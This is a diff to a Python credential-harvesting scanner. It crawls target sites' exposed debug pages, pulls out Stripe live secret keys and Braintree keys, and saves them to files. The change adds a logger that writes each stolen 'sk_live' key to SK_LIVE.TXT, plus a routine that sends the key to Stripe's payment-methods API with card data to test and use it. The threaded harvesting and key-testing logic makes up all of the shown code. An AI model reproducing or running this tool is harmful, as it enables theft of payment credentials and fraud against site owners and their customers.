@@ -40,24 +40,30 @@ class ENV:
                 with open(os.path.join('DEBUG', f'{url}_debug.htm'), 'w', encoding='utf-8') as output:
                     output.write(f'{resp}\n')
                 self.counts["total_debug"] += 1
+
                 if "sk_live" in resp:
                     with open(os.path.join('SK', f'{url}_debug.htm'), 'w', encoding='utf-8') as output:
                         output.write(f'{resp}\n')
                     matches = re.findall(pattern, resp)
                     for match in matches:
                         sk_live = f"sk_live_{match}"
-                        self.make_stripe_request(sk_live)
+                        self.log_live_key(sk_live)
+                        self.process_sk(sk_live)
+
                 if "BRAINTREE_PUBLIC_KEY" in resp:
                     with open('Braintree.txt', 'a') as file_object:
                         file_object.write(f'Braintree : {url}\n')
                     self.counts["braintree"] += 1
-            else:
-                self.counts["dead_sk"] += 1
         except Exception:
-            self.counts["dead_sk"] += 1
+            pass
         self.update_console()
 
-    def make_stripe_request(self, sk_live_key):
+    def log_live_key(self, line):
+        sk_live_key = re.sub(".*sk_live", "sk_live", line)
+        with open('SK_LIVE.TXT', 'a') as file_object:
+            file_object.write(sk_live_key + '\n')
+
+    def process_sk(self, sk_live_key):
         url = "https://api.stripe.com/v1/payment_methods"
         data = {
             "type": "card",
@@ -130,5 +136,8 @@ if __name__ == '__main__':
         env_scanner = ENV()
         for data in argFile:
             threads.append(executor.submit(env_scanner.scan, data))
+
+    for task in threads:
+        task.result()
 
     quit()
